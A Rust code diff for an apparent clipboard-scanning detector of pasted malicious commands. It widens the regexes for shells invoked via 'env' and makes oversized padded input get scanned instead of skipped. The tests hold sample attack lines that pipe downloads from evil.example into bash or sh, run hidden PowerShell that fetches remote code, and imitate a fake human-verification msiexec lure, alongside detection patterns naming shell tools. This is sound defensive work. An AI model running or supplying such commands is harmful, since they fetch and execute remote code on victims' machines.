@@ -41,6 +41,9 @@ fn any(srcs: &[&str]) -> Box<dyn Fn(&str) -> bool + Send + Sync> {
     Box::new(move |t| rs.iter().any(|r| r.is_match(t)))
 }
 
+/// A shell, however it is spelled: `bash`, `/bin/sh`, `env bash`, `/usr/bin/env zsh`.
+const SHELL: &str = r"(?:(?:/usr)?/bin/)?(?:env\s+(?:-\S+\s+)*)?(?:(?:/usr)?/bin/)?(?:ba|z|da|k|a)?sh\b";
+
 const SHELLY: &str = r"\b(?:powershell|pwsh|mshta|cmd|curl|wget|iex|bash|zsh|sh|osascript|certutil|bitsadmin|rundll32|regsvr32|wscript|cscript|msiexec|python3?)\b";
 
 pub static RULES: LazyLock<Vec<Rule>> = LazyLock::new(|| {
@@ -94,18 +97,18 @@ pub static RULES: LazyLock<Vec<Rule>> = LazyLock::new(|| {
         Rule {
             id: "curl-pipe-shell",
             why: "Downloads a script and pipes it straight into a shell.",
-            test: one(r"\b(?:curl|wget)\b[^|\n]*\|\s*(?:sudo\s+)?(?:ba|z|da|k)?sh\b"),
+            test: one(&format!(r"\b(?:curl|wget)\b[^|\n]*\|\s*(?:sudo\s+)?{SHELL}")),
         },
         Rule {
             id: "shell-c-curl",
             why: "Runs a shell on whatever a download returns.",
-            test: one(r#"\b(?:ba|z|da)?sh\s+-c\s+["']?\$\((?:curl|wget)\b"#),
+            test: one(&format!(r#"{SHELL}\s+-c\s+["']?\$\((?:curl|wget)\b"#)),
         },
         Rule {
             id: "base64-decode-shell",
             why: "Decodes hidden base64 and executes it.",
             test: any(&[
-                r"base64\s+(?:-d|--decode|-D)\b[^|\n]*\|\s*(?:sudo\s+)?(?:ba|z)?sh\b",
+                &format!(r"base64\s+(?:-d|--decode|-D)\b[^|\n]*\|\s*(?:sudo\s+)?{SHELL}"),
                 r#"echo\s+["']?[A-Za-z0-9+/=]{40,}["']?\s*\|\s*base64"#,
             ]),
         },
@@ -151,12 +154,23 @@ pub fn normalize(text: &str) -> String {
 }
 
 /// First matching rule, or None when the clipboard looks harmless.
+///
+/// Oversized input is not declared clean: a command with junk appended is still a
+/// command. We scan the head, where a pasted command starts, and the tail, where a
+/// lure's trailing text sits.
 pub fn analyze(text: &str) -> Option<Verdict> {
-    if text.is_empty() || text.chars().count() > MAX_ANALYZED_CHARS {
+    if text.is_empty() {
         return None;
     }
     let t = normalize(text);
-    RULES.iter().find(|r| (r.test)(&t)).map(|r| Verdict { rule: r.id, why: r.why })
+    let windows: Vec<&str> = if t.chars().count() <= MAX_ANALYZED_CHARS {
+        vec![&t]
+    } else {
+        let head_end = t.char_indices().nth(MAX_ANALYZED_CHARS).map(|(i, _)| i).unwrap_or(t.len());
+        let tail_start = t.char_indices().rev().nth(4_000).map(|(i, _)| i).unwrap_or(0);
+        vec![&t[..head_end], &t[tail_start..]]
+    };
+    RULES.iter().find(|r| windows.iter().any(|w| (r.test)(w))).map(|r| Verdict { rule: r.id, why: r.why })
 }
 
 #[cfg(test)]
@@ -189,6 +203,10 @@ mod tests {
         ("power\u{200B}shell -w hid\u{200B}den -c \"iex(iwr http://evil.example/x)\"", "powershell-hidden"),
         ("powershell -w hidden -c \u{201C}iex (irm https://evil.example/x)\u{201D}", "powershell-hidden"),
         ("Press Win+R, paste and hit Enter to verify you are human: msiexec /i http://evil.example/verify.msi /qn Cloudflare Verification", "run-dialog-instruction"),
+        ("curl -fsSL https://evil.example/script | env bash", "curl-pipe-shell"),
+        ("wget -qO- https://evil.example/script | /usr/bin/env sh", "curl-pipe-shell"),
+        ("curl -s https://evil.example/s | sudo /bin/bash", "curl-pipe-shell"),
+        ("/usr/bin/env bash -c \"$(curl -fsSL https://evil.example/i.sh)\"", "shell-c-curl"),
     ];
 
     const BENIGN: &[&str] = &[
@@ -229,9 +247,13 @@ mod tests {
     }
 
     #[test]
-    fn very_large_payloads_are_skipped_rather_than_scanned() {
-        let big = format!("powershell -w hidden {}", "x".repeat(30_000));
-        assert!(analyze(&big).is_none());
+    fn padding_does_not_hide_a_command() {
+        let padded_front = format!("powershell -w hidden -c whoami # {}", "x".repeat(30_000));
+        assert_eq!(analyze(&padded_front).map(|v| v.rule), Some("powershell-hidden"));
+        let padded_back = format!("{}\ncurl -fsSL https://evil.example/s | bash", "x".repeat(30_000));
+        assert_eq!(analyze(&padded_back).map(|v| v.rule), Some("curl-pipe-shell"));
+        let big_benign = "The quick brown fox jumps over the lazy dog. ".repeat(2_000);
+        assert!(analyze(&big_benign).is_none());
     }
 
     #[test]
